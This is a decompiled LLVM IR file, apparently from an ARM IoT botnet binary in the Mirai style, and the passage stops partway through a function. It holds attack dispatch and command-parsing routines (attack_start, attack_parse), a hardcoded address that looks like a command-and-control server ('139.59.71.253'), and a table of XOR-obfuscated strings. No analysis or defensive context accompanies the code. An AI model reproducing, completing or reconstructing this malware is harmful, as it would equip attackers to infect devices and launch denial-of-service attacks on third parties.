source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_21694.22 = global i32 0
@global_var_d790.26 = constant i32 -382906384
@global_var_218b8.31 = global i32 0
@global_var_831c.32 = constant i32 -352321547
@global_var_12a54.33 = constant i32 -382909968
@global_var_a088.39 = constant i32 -382906384
@global_var_a4c0.41 = constant i32 -382906384
@global_var_89ac.43 = constant i32 -382906384
@global_var_c1dc.45 = constant i32 -382906384
@global_var_bae4.47 = constant i32 -382906384
@global_var_b330.49 = constant i32 -382906384
@global_var_9a6c.52 = constant i32 -382906384
@global_var_93d8.54 = constant i32 -382906384
@global_var_243d4.57 = global i32 0
@global_var_18f48.69 = constant i32 47
@global_var_243dc.71 = global i32 0
@global_var_218bc.73 = global i32 0
@global_var_243d8.75 = global i32 0
@global_var_c700.76 = constant i32 -352321440
@global_var_109e8.78 = constant i32 -382910336
@global_var_d34c.79 = constant i32 -509607932
@global_var_d658.81 = constant i32 -382910448
@global_var_21748.83 = global i32 66464
@global_var_21740.85 = global i32 -1
@global_var_18f4c.90 = constant [14 x i8] c"139.59.71.253\00"
@global_var_243e4.93 = local_unnamed_addr global i32 0
@global_var_243e2.94 = local_unnamed_addr global i32 0
@global_var_218c0.96 = global i32 0
@global_var_18f5c.104 = constant i32 10
@global_var_21744.107 = global i32 -1
@global_var_13f30.111 = constant i32 -450904024
@global_var_103a0.112 = constant i32 -382910352
@global_var_18f60.115 = constant i32 16777216
@global_var_218c8.117 = global i32 0
@global_var_218d4.119 = global i32 0
@global_var_218cc.121 = global i32 0
@global_var_218d0.123 = global i32 0
@global_var_2190c.137 = global i32 0
@global_var_218d8.139 = global i32 0
@global_var_21904.141 = global i32 0
@global_var_243f8.145 = global i32 0
@global_var_243f0.149 = global i32 0
@global_var_243f4.151 = global i32 0
@global_var_218de.154 = local_unnamed_addr global i32 0
@global_var_218e0.158 = local_unnamed_addr global i32 0
@global_var_218e4.159 = local_unnamed_addr global i32 0
@global_var_218e5.160 = local_unnamed_addr global i32 0
@global_var_218fe.163 = local_unnamed_addr global i32 0
@global_var_18f6c.165 = constant i32 0
@global_var_18f68.167 = constant [5 x i8] c"&;; \00"
@global_var_18f70.169 = constant [5 x i8] c"5:?;\00"
@global_var_18f78.171 = constant [9 x i8] c"<!: acam\00"
@global_var_18f84.173 = constant [7 x i8] c" 18:1 \00"
@global_var_18f8c.175 = constant [8 x i8] c"0125!8 \00"
@global_var_18f94.177 = constant [9 x i8] c"$5''#;&0\00"
@global_var_18fa0.179 = constant [6 x i8] c"509=:\00"
@global_var_18fa8.181 = constant [6 x i8] c"\22=.,\22\00"
@global_var_18fb0.183 = constant [8 x i8] c"'!$$;& \00"
@global_var_18fb8.185 = constant i32 423502179
@global_var_18fc8.187 = constant [6 x i8] c"efg`a\00"
@global_var_18fd0.189 = constant [5 x i8] c"!'1&\00"
@global_var_18fd8.191 = constant i32 943467547
@global_var_18fe4.193 = constant i32 322070023
@global_var_218e8.194 = local_unnamed_addr global i32 0
@global_var_218e6.195 = local_unnamed_addr global i32 0
@global_var_218ec.196 = local_unnamed_addr global i32 0
@global_var_218f4.198 = local_unnamed_addr global i32 0
@global_var_21900.199 = local_unnamed_addr global i32 0
@global_var_e168.201 = constant i32 -382910352
@global_var_18ff0.203 = constant [3 x i8] c"\0D\0A\00"
@global_var_18ffc.205 = constant i32 2096127
@global_var_18ff3.207 = constant i32 2095871
@global_var_f3bc.208 = constant i32 137480
@global_var_24400.213 = global i32 0
@global_var_21750.216 = global i32 -555811921
@global_var_19000.221 = constant [3 x i8] c"Qm\00"
@global_var_24408.222 = local_unnamed_addr global i32 0
@global_var_2440c.223 = local_unnamed_addr global i32 0
@global_var_10070.224 = constant i32 102404
@global_var_19004.225 = constant i32 59987
@global_var_24410.226 = local_unnamed_addr global i32 0
@global_var_24414.227 = local_unnamed_addr global i32 0
@global_var_1916c.229 = constant i32 808465680
@global_var_2441c.230 = local_unnamed_addr global i32 0
@global_var_24418.231 = local_unnamed_addr global i32 0
@global_var_19008.233 = constant [7 x i8] c"'<188T\00"
@global_var_24420.234 = local_unnamed_addr global i32 0
@global_var_24424.235 = local_unnamed_addr global i32 0
@global_var_19010.237 = constant [8 x i8] c"1:5681T\00"
@global_var_24428.238 = local_unnamed_addr global i32 0
@global_var_2442c.239 = local_unnamed_addr global i32 0
@global_var_19018.241 = constant [8 x i8] c"'-' 19T\00"
@global_var_24430.242 = local_unnamed_addr global i32 0
@global_var_24434.243 = local_unnamed_addr global i32 0
@global_var_19020.245 = constant [4 x i8] c"'<T\00"
@global_var_2443c.246 = local_unnamed_addr global i32 0
@global_var_24438.247 = local_unnamed_addr global i32 0
@global_var_19024.249 = constant i32 977090171
@global_var_24444.250 = local_unnamed_addr global i32 0
@global_var_24440.251 = local_unnamed_addr global i32 0
@global_var_19038.253 = constant i32 470227742
@global_var_2444c.254 = local_unnamed_addr global i32 0
@global_var_24448.255 = local_unnamed_addr global i32 0
@global_var_19054.257 = constant [10 x i8] c":7;&&17 T\00"
@global_var_24454.258 = local_unnamed_addr global i32 0
@global_var_24450.259 = local_unnamed_addr global i32 0
@global_var_19060.261 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_24458.262 = local_unnamed_addr global i32 0
@global_var_2445c.263 = local_unnamed_addr global i32 0
@global_var_19074.265 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_24464.266 = local_unnamed_addr global i32 0
@global_var_24460.267 = local_unnamed_addr global i32 0
@global_var_1908c.269 = constant [8 x i8] c"{$&;7{T\00"
@global_var_24468.270 = local_unnamed_addr global i32 0
@global_var_2446c.271 = local_unnamed_addr global i32 0
@global_var_19094.273 = constant [6 x i8] c"{1,1T\00"
@global_var_24470.274 = local_unnamed_addr global i32 0
@global_var_24474.275 = local_unnamed_addr global i32 0
@global_var_1909c.277 = constant [5 x i8] c"{20T\00"
@global_var_2447c.278 = local_unnamed_addr global i32 0
@global_var_24478.279 = local_unnamed_addr global i32 0
@global_var_190a4.281 = constant [7 x i8] c"{95$'T\00"
@global_var_24480.282 = local_unnamed_addr global i32 0
@global_var_24484.283 = local_unnamed_addr global i32 0
@global_var_190ac.285 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_24488.286 = local_unnamed_addr global i32 0
@global_var_2448c.287 = local_unnamed_addr global i32 0
@global_var_190bc.289 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_244e8.290 = local_unnamed_addr global i32 0
@global_var_244ec.291 = local_unnamed_addr global i32 0
@global_var_190c8.293 = constant [8 x i8] c"z5:=91T\00"
@global_var_244f0.294 = local_unnamed_addr global i32 0
@global_var_244f4.295 = local_unnamed_addr global i32 0
@global_var_190d0.297 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_24490.298 = local_unnamed_addr global i32 0
@global_var_24494.299 = local_unnamed_addr global i32 0
@global_var_190e4.301 = constant [9 x i8] c"5''#;&0T\00"
@global_var_24498.302 = local_unnamed_addr global i32 0
@global_var_2449c.303 = local_unnamed_addr global i32 0
@global_var_1918c.305 = constant i32 557516544
@global_var_244a4.306 = local_unnamed_addr global i32 0
@global_var_244a0.307 = local_unnamed_addr global i32 0
@global_var_190f0.309 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_244ac.310 = local_unnamed_addr global i32 0
@global_var_244a8.311 = local_unnamed_addr global i32 0
@global_var_19104.313 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_244b4.314 = local_unnamed_addr global i32 0
@global_var_244b0.315 = local_unnamed_addr global i32 0
@global_var_19114.317 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_244b8.318 = local_unnamed_addr global i32 0
@global_var_244bc.319 = local_unnamed_addr global i32 0
@global_var_19124.321 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_244c4.322 = local_unnamed_addr global i32 0
@global_var_244c0.323 = local_unnamed_addr global i32 0
@global_var_19138.325 = constant [9 x i8] c"$662*7!E\00"
@global_var_244c8.326 = local_unnamed_addr global i32 0
@global_var_244cc.327 = local_unnamed_addr global i32 0
@global_var_19144.329 = constant [6 x i8] c";3=:T\00"
@global_var_244d0.330 = local_unnamed_addr global i32 0
@global_var_244d4.331 = local_unnamed_addr global i32 0
@global_var_1914c.333 = constant [7 x i8] c"1: 1&T\00"
@global_var_244d8.334 = local_unnamed_addr global i32 0
@global_var_244dc.335 = local_unnamed_addr global i32 0
@global_var_19154.337 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_244e0.338 = local_unnamed_addr global i32 0
@global_var_244e4.339 = local_unnamed_addr global i32 0
@global_var_21698.346 = global i32 0
@global_var_10e7c.348 = constant i32 -516948194
@global_var_10d40.354 = constant i32 -443088884
@global_var_10ca0.357 = constant i32 -516948194
@global_var_10a5c.365 = constant i32 -516948194
@global_var_10a18.368 = constant i32 -516948194
@global_var_111dc.387 = constant i32 -456978431
@global_var_fe9c.423 = constant i32 -476053496
@global_var_11a14.430 = constant i32 -478871519
@global_var_124b8.447 = constant i32 -478805983
@global_var_f220.449 = constant i32 -481165250
@global_var_128a0.458 = constant i32 -382906384
@global_var_149b0.468 = constant i32 -442544040
@global_var_13238.491 = constant i32 -369098502
@global_var_13c0c.506 = constant i32 -382910288
@global_var_13dbc.518 = constant i32 -2020859901
@global_var_13ea8.521 = constant i32 -494075872
@global_var_10bac.522 = constant i32 -382910336
@global_var_24880.525 = local_unnamed_addr global i32 0
@global_var_12cd0.539 = constant i32 -442543860
@global_var_11140.547 = constant i32 -369093190
@global_var_cce4.574 = constant i32 -509607926
@global_var_14ea8.576 = constant i32 -382910352
@global_var_162b8.597 = constant i32 -382906384
@global_var_15d78.626 = constant i32 -382910448
@global_var_17768.627 = constant i32 -382909968
@global_var_17ea4.689 = constant i32 -481296376
@global_var_17f9c.690 = constant i32 -481296376
@global_var_18020.691 = constant i32 -369098732
@global_var_21898.12 = external global i8*
@global_var_218b4.29 = external global i8*
@global_var_218b5.37 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_2174c.87 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_243e0.92 = global i16* null
@global_var_218c4.109 = external global i8*
@global_var_21908.143 = global i16* null
@global_var_218dc.153 = external global i8*
@global_var_218f0.156 = global i16 0
@global_var_218fc.157 = local_unnamed_addr global i8 0
@global_var_218f2.161 = local_unnamed_addr global i16 0
@global_var_218fd.162 = local_unnamed_addr global i8 0
@global_var_216f0.341 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_21898.12 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_21898.12 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_21898.12, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_21694.22, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_21694.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_21694.22, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_d790.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 102200, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_218b4.29 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_218b8.31 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_218b8.31, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  store i32 %v2_82c4, i32* @ip, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  store i32 %v7_82dc, i32* @ip, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  store i32 %v2_8310, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, 65280
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul nuw nsw i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v5_8368 = call i32 @llvm.bswap.i32(i32 %v2_834c)
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
